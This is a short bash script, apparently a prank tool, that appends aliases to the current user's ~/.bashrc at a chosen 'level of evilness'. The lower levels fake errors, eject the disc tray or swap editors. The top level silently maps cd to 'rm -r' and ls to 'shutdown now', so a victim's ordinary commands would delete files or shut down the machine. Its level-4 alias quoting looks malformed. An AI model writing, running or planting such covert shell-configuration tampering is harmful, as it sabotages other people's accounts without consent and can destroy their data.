#!/bin/bash

if [[ -z "$1" ]]; then
	echo "Enter a level of evilness:"
	echo "  1 Warning (h/d=1/1)"
	echo "  2 Annoyance (h/d=3/0)"
	echo "  3 Evil (h/d=6/1)  [the classic editor swap]"
	echo "  4 EVIL (h/d=8/3)"
	echo "    (WARNING!  THIS IS POTENTIALLY HARMFUL!)"
	exit 1
fi

if [[ "$1" == "1" ]]; then
	echo "alias ls='echo \"You should learn to log out...\"'" >> ~/.bashrc
	echo "alias cd='echo \"You should learn to log out...\"'" >> ~/.bashrc
elif [[ "$1" == "2" ]]; then
	echo "alias cd='eject -t; cd'" >> ~/.bashrc
	echo "alias ls='echo \"Segmentation fault\"'" >> ~/.bashrc
elif [[ "$1" == "3" ]]; then
	echo "alias vi=nano" >> ~/.bashrc
	echo "alias vim=nano" >> ~/.bashrc
	echo "alias nano=emacs" >> ~/.bashrc
	echo "alias emacs=vim" >> ~/.bashrc
elif [[ "$1" == "4" ]]; then
	echo "alias 'cd=\"rm -r\"'" >> ~/.bashrc
	echo "alias 'ls=\"shutdown now\"'" >> ~/.bashrc
fi

echo "Done!"
